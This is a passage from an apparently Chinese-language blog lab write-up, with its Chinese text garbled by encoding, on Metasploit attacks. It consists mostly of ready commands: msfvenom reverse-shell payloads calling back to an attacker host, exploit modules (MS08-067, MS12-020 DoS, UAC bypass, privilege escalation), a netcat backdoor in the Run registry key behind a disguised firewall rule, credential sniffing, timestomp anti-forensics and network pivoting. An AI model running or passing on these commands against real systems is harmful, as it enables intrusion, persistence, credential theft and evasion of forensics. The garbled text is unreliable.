<h3 id="ä¾‹ä¸‰ï¼ŒRDPè¿œç¨‹æ¡Œé¢æ¼æ´"><a href="#ä¾‹ä¸‰ï¼ŒRDPè¿œç¨‹æ¡Œé¢æ¼æ´" class="headerlink" title="ä¾‹ä¸‰ï¼ŒRDPè¿œç¨‹æ¡Œé¢æ¼æ´"></a>ä¾‹ä¸‰ï¼ŒRDPè¿œç¨‹æ¡Œé¢æ¼æ´</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">use auxiliary/scanner/rdp/ms12_020_check # æ— DOSæ”»å‡»</span><br><span class="line">set rhosts 192.168.1.200</span><br><span class="line">run</span><br><span class="line"></span><br><span class="line">use auxiliary/dos/windows/rdp/ms12_020_maxchannelids  # DOSæ”»å‡»ï¼Œè“å±å…³æœº</span><br></pre></td></tr></table></figure>

<h3 id="ä¾‹å››ï¼Œæ˜¾ç¤ºç›®å½•åŠæ–‡ä»¶"><a href="#ä¾‹å››ï¼Œæ˜¾ç¤ºç›®å½•åŠæ–‡ä»¶" class="headerlink" title="ä¾‹å››ï¼Œæ˜¾ç¤ºç›®å½•åŠæ–‡ä»¶"></a>ä¾‹å››ï¼Œæ˜¾ç¤ºç›®å½•åŠæ–‡ä»¶</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">use auxiliary/scanner/http/files_dir</span><br><span class="line">run</span><br></pre></td></tr></table></figure>

<h3 id="ä¾‹äº”ï¼ŒWebDAV-Unicodeç¼–ç èº«ä»½éªŒè¯ç»•è¿‡"><a href="#ä¾‹äº”ï¼ŒWebDAV-Unicodeç¼–ç èº«ä»½éªŒè¯ç»•è¿‡" class="headerlink" title="ä¾‹äº”ï¼ŒWebDAV Unicodeç¼–ç èº«ä»½éªŒè¯ç»•è¿‡"></a>ä¾‹äº”ï¼ŒWebDAV Unicodeç¼–ç èº«ä»½éªŒè¯ç»•è¿‡</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">use auxiliary/scanner/http/dir_webdav_unicode_bypass</span><br><span class="line">run</span><br></pre></td></tr></table></figure>

<h3 id="ä¾‹å…­ï¼Œwmap"><a href="#ä¾‹å…­ï¼Œwmap" class="headerlink" title="ä¾‹å…­ï¼Œwmap"></a>ä¾‹å…­ï¼Œwmap</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">é¦–å…ˆéœ€è¦load wmap</span><br><span class="line">æ ¹æ®sqlmapå·¥ä½œæ¨¡å¼å¼€å‘</span><br></pre></td></tr></table></figure>

<h1 id="0x04-MSFå®¢æˆ·ç«¯æ¸—é€"><a href="#0x04-MSFå®¢æˆ·ç«¯æ¸—é€" class="headerlink" title="0x04.MSFå®¢æˆ·ç«¯æ¸—é€"></a>0x04.MSFå®¢æˆ·ç«¯æ¸—é€</h1><h2 id="å®éªŒæ¡ˆä¾‹-1"><a href="#å®éªŒæ¡ˆä¾‹-1" class="headerlink" title="å®éªŒæ¡ˆä¾‹"></a>å®éªŒæ¡ˆä¾‹</h2><h3 id="æ¡ˆä¾‹1"><a href="#æ¡ˆä¾‹1" class="headerlink" title="æ¡ˆä¾‹1"></a>æ¡ˆä¾‹1</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp lhost=192.168.1.6 lport=4444 -b &#x27;\x00\xff&#x27; -e x86/shikata_ga_nai -i 5 -f exe -o what.exe</span><br><span class="line"></span><br><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/shell/reverse_tcp</span><br><span class="line">set lhost 192.168.1.6</span><br><span class="line">run</span><br></pre></td></tr></table></figure>

<h1 id="0x05-åæ¸—é€æµ‹è¯•"><a href="#0x05-åæ¸—é€æµ‹è¯•" class="headerlink" title="0x05.åæ¸—é€æµ‹è¯•"></a>0x05.åæ¸—é€æµ‹è¯•</h1><h2 id="å®éªŒæ¡ˆä¾‹-2"><a href="#å®éªŒæ¡ˆä¾‹-2" class="headerlink" title="å®éªŒæ¡ˆä¾‹"></a>å®éªŒæ¡ˆä¾‹</h2><h3 id="ææƒï¼Œæ¡ˆä¾‹ä¸€"><a href="#ææƒï¼Œæ¡ˆä¾‹ä¸€" class="headerlink" title="ææƒï¼Œæ¡ˆä¾‹ä¸€"></a>ææƒï¼Œæ¡ˆä¾‹ä¸€</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp</span><br><span class="line">LHOST=192.168.1.6 LPORT=4444 -b &quot;\x00&quot; -e x86/shikata_ga_nai -f exe -o</span><br><span class="line">1.exe</span><br><span class="line"></span><br><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line">set lhost 192.168.1.6</span><br><span class="line">exploit -j</span><br><span class="line">è¿è¡Œ1.exe</span><br><span class="line"></span><br><span class="line">å¾—åˆ°LLunaç”¨æˆ·æƒé™</span><br><span class="line">meterpreter &gt; getuid</span><br><span class="line">Server username: L-CD1028181A2B4\Lluna</span><br><span class="line"></span><br><span class="line">ææƒ</span><br><span class="line">meterpreter &gt; getsystem </span><br><span class="line">...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).</span><br><span class="line">meterpreter &gt; getuid</span><br><span class="line">Server username: NT AUTHORITY\SYSTEM</span><br><span class="line"></span><br><span class="line">åŸºäºsessionææƒ(UACå…è®¸)</span><br><span class="line">background</span><br><span class="line">use exploit/windows/local/ask</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line">set lhost 192.168.1.6</span><br><span class="line">set filename winupdate.exe</span><br><span class="line">set session 1</span><br><span class="line">ç‚¹å‡»ç¡®å®šget shell</span><br><span class="line">meterpreter &gt; getuid</span><br><span class="line">Server username: L-CD1028181A2B4\Lluna</span><br><span class="line">meterpreter &gt; getsystem </span><br><span class="line">...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).</span><br><span class="line">meterpreter &gt; getuid</span><br><span class="line">Server username: NT AUTHORITY\SYSTEM</span><br><span class="line">meterpreter &gt; </span><br><span class="line"></span><br><span class="line">ç»•è¿‡UACææƒï¼Œä¼šå‡ºç°Already in elevated stateï¼ˆå·²ç»å¤„äºæå‡çŠ¶æ€ï¼‰</span><br><span class="line">use exploit/windows/local/bypassuac</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line">set lhost 192.168.1.6</span><br><span class="line">set session 1</span><br><span class="line"></span><br><span class="line">ä½¿ç”¨DDLåŠ¨æ€é“¾æ¥åº“ç»•è¿‡</span><br><span class="line">use exploit/windows/local/bypassuac_injection</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line">set lhost 192.168.1.6</span><br><span class="line"></span><br><span class="line">ä½¿ç”¨æ¼æ´ææƒ</span><br><span class="line">use exploit/windows/local/ms13_053_schlamperei</span><br></pre></td></tr></table></figure>

<h3 id="æ¡ˆä¾‹äºŒï¼Œä½¿ç”¨æ³¨å†Œè¡¨æ·»åŠ NCåé—¨æœåŠ¡"><a href="#æ¡ˆä¾‹äºŒï¼Œä½¿ç”¨æ³¨å†Œè¡¨æ·»åŠ NCåé—¨æœåŠ¡" class="headerlink" title="æ¡ˆä¾‹äºŒï¼Œä½¿ç”¨æ³¨å†Œè¡¨æ·»åŠ NCåé—¨æœåŠ¡"></a>æ¡ˆä¾‹äºŒï¼Œä½¿ç”¨æ³¨å†Œè¡¨æ·»åŠ NCåé—¨æœåŠ¡</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; upload /usr/share/windows-binaries/nc.exe C:\\windows\\system32(ä¸Šä¼ nc)</span><br><span class="line">æŸ¥çœ‹é”®å€¼å¯¹</span><br><span class="line">reg enumkey -k HKLM\\software\\microsoft\\windows\\currentversion\\run</span><br><span class="line">å¢åŠ é”®å€¼å¯¹</span><br><span class="line">reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v nc -d &#x27;C:\windows\system32\nc.exe -Ldp 444 -e cmd.exe&#x27;</span><br><span class="line"></span><br><span class="line">å†æ¬¡æŸ¥çœ‹</span><br><span class="line">reg queryval -k HKLM\\software\\microsoft\\windows\\currentversion\\Run -v nc</span><br><span class="line"></span><br><span class="line">æ‰“å¼€ä¸€ä¸ªéšå¼shellï¼Œå¹¶æŸ¥çœ‹é˜²ç«å¢™</span><br><span class="line">execute -f cmd -i -H</span><br><span class="line">netsh firewall show opmode</span><br><span class="line"></span><br><span class="line">å¦‚æœå¼€å¯åˆ™æ·»åŠ æ”¾è¡Œç­–ç•¥</span><br><span class="line">netsh firewall add portopening TCP 444 &quot;Core Networking - DNS (UDP-Out) - fjy&quot; ENABLE ALL</span><br><span class="line">(Core Networking - DNS (UDP-Out)ä¸ºç³»ç»Ÿè‡ªå¸¦è§„åˆ™ç”¨äºä¼ªè£…)</span><br><span class="line"></span><br><span class="line">é‡å¯</span><br><span class="line">shutdown -r -t 0</span><br><span class="line"></span><br><span class="line">è¿æ¥</span><br><span class="line">nc 192.168.1.200 444</span><br></pre></td></tr></table></figure>

<img src="/2020/08/18/MSF%E7%9A%84%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/image-20200705201304290.png" class>

<img src="/2020/08/18/MSF%E7%9A%84%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/image-20200705202016725.png" class>


<h3 id="æ¡ˆä¾‹ä¸‰ã€æŠ“åŒ…"><a href="#æ¡ˆä¾‹ä¸‰ã€æŠ“åŒ…" class="headerlink" title="æ¡ˆä¾‹ä¸‰ã€æŠ“åŒ…"></a>æ¡ˆä¾‹ä¸‰ã€æŠ“åŒ…</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">åœ¨è·å–åˆ°meterpreter shellçš„æƒ…å†µä¸‹</span><br><span class="line">meterpreter &gt; load sniffer    # å¯¼å…¥sniffer</span><br><span class="line">meterpreter &gt; sniffer_start 3 # é€‰æ‹©ç½‘å¡è¿›è¡ŒæŠ“åŒ…ï¼ŒæŠ“åŒ…æ–¹æ³•ä¸ºåœ¨å†…å­˜ä¸­ç¼“å­˜åŒºå—å¾ªç¯å­˜å‚¨æŠ“åŒ…ï¼Œé»˜è®¤50000ä¸ªåŒ…ï¼Œä¸å†™ç¡¬ç›˜ä¸­ï¼Œå¹¶ä¸”æ™ºèƒ½è¿‡æ»¤meterpreteræµé‡ï¼Œä¼ è¾“è¿‡ç¨‹ä½¿ç”¨SSL/TLSåŠ å¯†ã€‚</span><br><span class="line">sniffer_dump 3 text.cap # ä¸‹è½½æŠ“åˆ°çš„åŒ…</span><br><span class="line"></span><br><span class="line">æŠ“åˆ°çš„åŒ…å¯ä»¥ä½¿ç”¨wiresharkè¿›è¡Œåˆ†æï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨MSFè‡ªå¸¦è§£ç è¿›è¡Œè§£ç </span><br><span class="line">use auxiliary/sniffer/psnuffle</span><br><span class="line">set PCAPFILE text.cap</span><br><span class="line">run</span><br></pre></td></tr></table></figure>

<img src="/2020/08/18/MSF%E7%9A%84%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/image-20200706121725585.png" class>

<p>å¯ä»¥çœ‹åˆ°ç”¨æˆ·åä¸å¯†ç </p>
<img src="/2020/08/18/MSF%E7%9A%84%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/image-20200706121809730.png" class>

<h3 id="æ¡ˆä¾‹å››ã€æ–‡ä»¶æœç´¢"><a href="#æ¡ˆä¾‹å››ã€æ–‡ä»¶æœç´¢" class="headerlink" title="æ¡ˆä¾‹å››ã€æ–‡ä»¶æœç´¢"></a>æ¡ˆä¾‹å››ã€æ–‡ä»¶æœç´¢</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; search -f *.ini</span><br><span class="line">search -d C:\\Users\ and\ settings\\administrator\\desktop\\ -f *.docx</span><br></pre></td></tr></table></figure>

<h3 id="æ¡ˆä¾‹äº”ã€æ—¶é—´å–è¯åˆ†æ"><a href="#æ¡ˆä¾‹äº”ã€æ—¶é—´å–è¯åˆ†æ" class="headerlink" title="æ¡ˆä¾‹äº”ã€æ—¶é—´å–è¯åˆ†æ"></a>æ¡ˆä¾‹äº”ã€æ—¶é—´å–è¯åˆ†æ</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">æ–‡ä»¶ç³»ç»Ÿè®¿é—®ä¼šç•™ä¸‹ç—•è¿¹ï¼Œç”µå­å–è¯é‡ç‚¹å…³æ³¨ã€‚</span><br><span class="line">æ¸—é€æµ‹è¯•è€…ä¸æ”»å‡»è€…å¾€å¾€å¸Œæœ›é”€æ¯æ–‡ä»¶ç³»ç»Ÿçš„è®¿é—®ç—•è¿¹ã€‚</span><br><span class="line">æœ€å¥½çš„é¿å…è¢«æ–‡ä»¶å–è¯å°±æ˜¯ä¸è¦è§¦ç¢°æ–‡ä»¶ç³»ç»Ÿã€‚</span><br><span class="line">meterpreterçš„ä¼˜åŠ¿åœ¨äºå®Œå…¨åŸºäºå†…å­˜ã€‚</span><br><span class="line">MAC æ—¶é—´ï¼ˆModified / Accessed / Changedï¼‰</span><br><span class="line">Mä¸ºæ–‡ä»¶ä¿®æ”¹æ—¶é—´ï¼ŒAä¸ºæ–‡ä»¶çš„è®¿é—®æ—¶é—´ï¼ŒCä¸ºæ–‡ä»¶æƒé™çš„ä¿®æ”¹æ—¶é—´</span><br><span class="line"></span><br><span class="line">åœ¨ç³»ç»Ÿä¸‹ä¿®æ”¹æ—¶é—´ï¼š</span><br><span class="line">ls -l --time=atime/ctime 1.txt # é»˜è®¤ä¸ºmtime</span><br><span class="line">stat 1.txt # åˆ—å‡ºå…¨éƒ¨æ—¶é—´</span><br><span class="line">touch -d &quot;2 days ago&quot; 1.txt # ä¿®æ”¹MAæ—¶é—´</span><br><span class="line">touch -t 1501010101 1.txt # ä¿®æ”¹ç²¾ç¡®æ—¶é—´ï¼Œå¹´æœˆæ—¥</span><br><span class="line"></span><br><span class="line">åœ¨meterpreterä¸‹ä¿®æ”¹æ—¶é—´ï¼š</span><br><span class="line">meterpreter &gt; timestomp -v 111 # æŸ¥çœ‹111æ–‡ä»¶çš„MACæ—¶é—´</span><br><span class="line">timestomp -f C:\\WINDOWS\\0.log 111 # -fä¸ºæŒ‡å®šä¸€ä¸ªæ¨¡æ¿ï¼Œå°†111çš„æ—¶é—´æ”¹ä¸º0.logçš„æ—¶é—´</span><br><span class="line"></span><br><span class="line">timestomp -a &quot;11/11/2018 11:11:11&quot; 111 # æŒ‡å®šä¿®æ”¹Açš„æ—¶é—´</span><br><span class="line">timestomp -m &quot;11/11/2018 11:11:11&quot; 111 # æŒ‡å®šä¿®æ”¹Mçš„æ—¶é—´</span><br><span class="line">timestomp -c &quot;11/11/2018 11:11:11&quot; 111 # æŒ‡å®šä¿®æ”¹Mçš„æ—¶é—´</span><br><span class="line">timestomp -z &quot;11/11/2024 11:11:11&quot; 111 # ä¸€æ¬¡ä¿®æ”¹ä¸‰ä¸ªæ—¶é—´</span><br><span class="line">timestomp -e &quot;11/11/2020 11:11:11&quot; 111 # æŒ‡å®šä¿®æ”¹E(Entry Modified)æ—¶é—´</span><br><span class="line">Entry Modifiedä¸ºMFTï¼Œä¸ºNTFSçš„æ–‡ä»¶ç³»ç»Ÿçš„ä¸»æ–‡ä»¶åˆ†é…è¡¨</span><br><span class="line">-b -r ä¸ºæ“¦é™¤MACEæ—¶é—´è¡¨ï¼Œç›®å‰å·²å¤±æ•ˆã€‚</span><br></pre></td></tr></table></figure>

<img src="/2020/08/18/MSF%E7%9A%84%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/image-20200706141936093.png" class>

<h3 id="æ¡ˆä¾‹å…­ã€ä½¿ç”¨Pivotingï¼ˆåŸºäºè·¯ç”±ï¼‰å®ç°è·³æ¿-æ¢çº½-æ”¯ç‚¹get-shell"><a href="#æ¡ˆä¾‹å…­ã€ä½¿ç”¨Pivotingï¼ˆåŸºäºè·¯ç”±ï¼‰å®ç°è·³æ¿-æ¢çº½-æ”¯ç‚¹get-shell" class="headerlink" title="æ¡ˆä¾‹å…­ã€ä½¿ç”¨Pivotingï¼ˆåŸºäºè·¯ç”±ï¼‰å®ç°è·³æ¿/æ¢çº½/æ”¯ç‚¹get shell"></a>æ¡ˆä¾‹å…­ã€ä½¿ç”¨Pivotingï¼ˆåŸºäºè·¯ç”±ï¼‰å®ç°è·³æ¿/æ¢çº½/æ”¯ç‚¹get shell</h3><h4 id="1-å®éªŒæ‹“æ‰‘"><a href="#1-å®éªŒæ‹“æ‰‘" class="headerlink" title="1.å®éªŒæ‹“æ‰‘"></a>1.å®éªŒæ‹“æ‰‘</h4><img src="/2020/08/18/MSF%E7%9A%84%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/image-20200707152622464.png" class>

<h4 id="2-å®éªŒç›®çš„"><a href="#2-å®éªŒç›®çš„" class="headerlink" title="2.å®éªŒç›®çš„"></a>2.å®éªŒç›®çš„</h4><blockquote>
<p>1.kaliä½¿ç”¨msfç”Ÿæˆåä¸ºhaha.exeçš„æ‰§è¡Œç¨‹åºï¼Œå¹¶è¯±ä½¿win_2k03æ‰§è¡Œï¼Œç„¶ååå¼¹ç»™kaliä¸€ä¸ªmeterpreter shellã€‚</p>
<p>2.å¾—åˆ°shellåä»¥win_2k03ä¸ºè·³æ¿ï¼Œæ§åˆ¶win_XPã€‚</p>
</blockquote>
<h4 id="3-å®éªŒè¿‡ç¨‹"><a href="#3-å®éªŒè¿‡ç¨‹" class="headerlink" title="3.å®éªŒè¿‡ç¨‹"></a>3.å®éªŒè¿‡ç¨‹</h4><p>1.é…ç½®é˜²ç«å¢™m0n01ï¼Œé…ç½®NAT</p>
<img src="/2020/08/18/MSF%E7%9A%84%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/image-20200707153518682.png" class>

<p>2.é…ç½®WLANå…³é—­æ‹’ç»ç§æœ‰ç½‘æ®µè®¿é—®ï¼Œä½¿è®¿é—®å…¶ä»–ä¸»æœºè®¿é—®192.168.1.4èƒ½å¤Ÿå®ç°NATã€‚</p>
<img src="/2020/08/18/MSF%E7%9A%84%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/image-20200707153857414.png" class>

<p>3.é…ç½®m0n02è§„åˆ™ï¼Œå…è®¸å…¨éƒ¨ç½‘æ®µå¯ä»¥å‡ºå»</p>
<img src="/2020/08/18/MSF%E7%9A%84%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/image-20200707155315502.png" class>

<p>4.æµ‹è¯•</p>
<img src="/2020/08/18/MSF%E7%9A%84%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/image-20200707155229810.png" class>

<p>5.ç”Ÿæˆhaha.exe</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@JIYE:~# msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=192.168.1.4 LPORT=4444 -b &quot;\x00&quot; -e x86/shikata_ga_nai -f exe -o haha.exe</span><br></pre></td></tr></table></figure>

<p>6.win_2k03ä¸‹è½½å¹¶è®¿é—®ï¼ˆè¯±éª—ï¼‰</p>
<img src="/2020/08/18/MSF%E7%9A%84%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/image-20200707155813729.png" class>

<p>7.kaliç›‘å¬ï¼Œwin_2k03è¿è¡Œhaha.exe</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">msfconsole -q</span><br><span class="line">msf5 &gt; use exploit/multi/handler</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line">set lhost 192.168.253.22  # è¿™é‡Œä¸æ˜¯192.168.1.4</span><br><span class="line">run</span><br></pre></td></tr></table></figure>

<img src="/2020/08/18/MSF%E7%9A%84%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/image-20200707160150775.png" class>

<p>8.æ·»åŠ åˆ°è¾¾192.168.254.0çš„è·¯ç”±ï¼Œä½¿ä»¥å192.168.254.0çš„è·¯ç”±éƒ½èµ°session1</p>
<img src="/2020/08/18/MSF%E7%9A%84%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/image-20200707162846401.png" class>

<p>9.æ‰«æç½‘æ®µ</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">use auxiliary/scanner/portscan/tcp</span><br><span class="line">set rhosts 192.168.254.20-192.168.254.30</span><br><span class="line">set ports 139,445</span><br><span class="line">run</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥çœ‹åˆ°20ä¸22æ˜¯å­˜æ´»çš„</p>
<img src="/2020/08/18/MSF%E7%9A%84%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/image-20200707163857984.png" class>

<p>10.ä½¿ç”¨nmapæ‰«æï¼Œå¯ä»¥çœ‹åˆ°æ·»åŠ çš„è·¯ç”±å¯¹nmapæ²¡æœ‰ä½œç”¨ã€‚</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">db_nmap -A -p 445 -Pn 192.168.254.22</span><br></pre></td></tr></table></figure>

<img src="/2020/08/18/MSF%E7%9A%84%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/image-20200707164742663.png" class>

<p>11.åˆ©ç”¨ms08067 get XP shell</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">use exploit/windows/smb/ms08_067_netapi</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line">set rhosts 192.168.254.22</span><br><span class="line">set target 34</span><br><span class="line">run</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œwin2k03æŒ‚äº†ï¼Œæ‰€ä»¥æˆ‘æ¢äº†ä¸ªwin7ï¼Œä½†å‡ºç°äº†ä¸ªé—®é¢˜ã€‚å¼¹å‡ºäº†ä¸€ä¸ªæ¶ˆæ¯ç‚¹å‡»å…è®¸å°±å¯ä»¥å¾—åˆ°shellï¼Œä½†æˆ‘å¤±è´¥äº†ã€‚ã€‚ã€‚</p>
<img src="/2020/08/18/MSF%E7%9A%84%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/image-20200707214348635.png" class>

<p>æ¥babyè®©æˆ‘ä»¬æ¢ä¸ªæ€è·¯ï¼Œç«Ÿç„¶åå¼¹ç»™win2k03å¤±è´¥ï¼Œé‚£ä¹ˆèƒ½ä¸èƒ½åå¼¹ç»™ä»–çš„ä¸Šä¸€çº§m0n0çš„wlanå£ï¼Œç†è®ºä¸Šæ˜¯å¯ä»¥ï¼Œå› ä¸ºæˆ‘ä»¬å·²ç»åŠ äº†ä¸€æ¡192.168.254.0/24çš„è·¯ç”±ï¼Œå¹¶ä¸”ç½‘å…³ä¸ºsession9ï¼Œå°è¯•ä¸€ä¸‹æ˜¯å¯ä»¥çš„ã€‚</p>
<p>è¿™é‡Œåœ¨è¿æ¥win2k03çš„sessionä¸­ä¸€å®šè¦åŠ 192.168.254.0/24çš„è·¯ç”±</p>
<img src="/2020/08/18/MSF%E7%9A%84%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/image-20200707221947516.png" class>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">set lhost 192.168.1.4</span><br><span class="line">run</span><br></pre></td></tr></table></figure>

<p>å·²ç»æ‹¿åˆ°win_XPçš„shell</p>
<img src="/2020/08/18/MSF%E7%9A%84%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/image-20200707221620618.png" class>

<img src="/2020/08/18/MSF%E7%9A%84%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/image-20200707222926242.png" class>

<p>ä¸¤ä¸ªshelléƒ½æ‹¿åˆ°æ‰‹äº†ã€‚</p>
<img src="/2020/08/18/MSF%E7%9A%84%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/image-20200707221906308.png" class>

<p>é‚£ä¹ˆè¿™ç§æƒ…å†µä¸‹çš„shellå¹¶ä¸æ˜¯ä»win2k03æ‹¿åˆ°çš„ï¼Œå¦‚ä¸‹å›¾ï¼Œè€Œæ˜¯ç”±session 9å»ºç«‹è¿æ¥ï¼Œå‘é€XP payloadï¼Œæ‰§è¡Œåç›´æ¥åå¼¹ç»™m0n0çš„wlanå£ï¼Œå¹¶ä¸ç»è¿‡win2k03ã€‚</p>
<img src="/2020/08/18/MSF%E7%9A%84%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/image-20200707223402391.png" class>

<p>å†çœ‹ä¸€ä¸‹win2k03ï¼ˆwin7ï¼‰</p>
<img src="/2020/08/18/MSF%E7%9A%84%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/image-20200707222635457.png" class>

<p>ç»¼ä¸Šï¼Œå®éªŒå®Œæˆã€‚</p>
<h3 id="æ¡ˆä¾‹ä¸ƒã€ä½¿ç”¨Pivotingï¼ˆåŸºäºç«¯å£è½¬å‘ï¼‰å®ç°è·³æ¿-æ¢çº½-æ”¯ç‚¹get-shell"><a href="#æ¡ˆä¾‹ä¸ƒã€ä½¿ç”¨Pivotingï¼ˆåŸºäºç«¯å£è½¬å‘ï¼‰å®ç°è·³æ¿-æ¢çº½-æ”¯ç‚¹get-shell" class="headerlink" title="æ¡ˆä¾‹ä¸ƒã€ä½¿ç”¨Pivotingï¼ˆåŸºäºç«¯å£è½¬å‘ï¼‰å®ç°è·³æ¿/æ¢çº½/æ”¯ç‚¹get shell"></a>æ¡ˆä¾‹ä¸ƒã€ä½¿ç”¨Pivotingï¼ˆåŸºäºç«¯å£è½¬å‘ï¼‰å®ç°è·³æ¿/æ¢çº½/æ”¯ç‚¹get shell</h3><p>åˆ é™¤session 9 çš„è·¯ç”±</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; run autoroute -d -s 192.168.254.0/24</span><br><span class="line">run autoroute -p</span><br></pre></td></tr></table></figure>

<img src="/2020/08/18/MSF%E7%9A%84%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/image-20200707224245019.png" class>

<p>æ·»åŠ ä¸€ä¸ªç«¯å£æ˜ å°„</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; portfwd add -L 192.168.253.22 -l 3389 -r 192.168.254.22 -p 3389</span><br></pre></td></tr></table></figure>

<img src="/2020/08/18/MSF%E7%9A%84%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/image-20200707224822057.png" class>

<p>æ‰§è¡Œï¼Œæ‹¿åˆ°shellã€‚</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@JIYE:~# rdesktop 192.168.253.22</span><br></pre></td></tr></table></figure>

<img src="/2020/08/18/MSF%E7%9A%84%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/image-20200707225206502.png" class>

<p>ç™»å…¥xpä¼šå¼¹è­¦å‘Š</p>
<img src="/2020/08/18/MSF%E7%9A%84%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/image-20200707225911526.png" class>

<img src="/2020/08/18/MSF%E7%9A%84%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/image-20200707230006676.png" class>

<p>kaliè¿æ¥ä¸Šçš„æ—¶å€™xpç”¨æˆ·ä¼šæ³¨é”€</p>
<img src="/2020/08/18/MSF%E7%9A%84%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/image-20200707230225787.png" class>

<img src="/2020/08/18/MSF%E7%9A%84%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/image-20200707230115548.png" class>

<p>å®Œã€‚ã€‚ã€‚</p>
<h3 id="æ¡ˆä¾‹å…«ï¼Œå¤šsessionsè¿æ¥"><a href="#æ¡ˆä¾‹å…«ï¼Œå¤šsessionsè¿æ¥" class="headerlink" title="æ¡ˆä¾‹å…«ï¼Œå¤šsessionsè¿æ¥"></a>æ¡ˆä¾‹å…«ï¼Œå¤šsessionsè¿æ¥</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=192.168.1.4 LPORT=4444 -b &quot;\x00&quot; -e x86/shikata_ga_nai -f exe -o a.exe</span><br><span class="line"></span><br><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line">set lhost 192.168.1.4</span><br><span class="line">set exitonsession # æŒç»­ç›‘å¬4444ç«¯å£ï¼Œèƒ½å¤ŸåŒæ—¶è·å–å¤šä¸ªsession</span><br><span class="line">run -j -z</span><br></pre></td></tr></table></figure>
<img src="/2020/08/18/MSF%E7%9A%84%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/image-20200709110800149.png" class>

<p>ä½¿ç”¨postæ¨¡å—è¿›è¡Œåæ¸—é€æµ‹è¯•</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">run post/windows/gather/arp_scanner RHOSTS=192.168.1.0/24 #æ‰«ææ•´ä¸ªç½‘æ®µ</span><br><span class="line">run post/windows/gather/checkvm # æ‰«æè™šæ‹Ÿæœº</span><br><span class="line">run post/windows/gather/credentials/credential_collector #ã€€æ‰«æèº«ä»½éªŒè¯ä¿¡æ¯(è´¦å·)token</span><br><span class="line">run post/windows/gather/enum_applications # æ‰«æå®‰è£…è½¯ä»¶çš„ä¿¡æ¯</span><br><span class="line">run post/windows/gather/enum_logged_on_users # æ‰«ææ­£å¤„äºç™»å…¥çš„è´¦å·(500ä¸ºç®¡ç†å‘˜)</span><br><span class="line">run post/windows/gather/enum_snmp # æŸ¥çœ‹snmpç›¸å…³é…ç½®</span><br><span class="line">run post/multi/recon/local_exploit_suggester # 